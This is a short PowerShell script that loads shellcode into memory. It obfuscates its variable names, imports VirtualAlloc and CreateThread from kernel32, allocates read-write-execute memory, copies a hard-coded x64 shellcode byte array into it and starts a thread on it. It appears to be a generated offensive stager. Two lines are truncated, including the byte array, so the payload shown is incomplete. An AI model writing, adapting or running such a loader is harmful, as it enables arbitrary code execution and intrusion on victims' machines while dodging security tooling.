$yNbDDkmwkmSv = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThre>
"@

$JKoPvedoB = Add-Type -memberDefinition $yNbDDkmwkmSv -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $mZCslWvu = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0>


$ooursOTo = $JKoPvedoB::VirtualAlloc(0,[Math]::Max($mZCslWvu.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($mZCslWvu,0,$ooursOTo,$mZCslWvu.Length)

$JKoPvedoB::CreateThread(0,0,$ooursOTo,0,0,0)
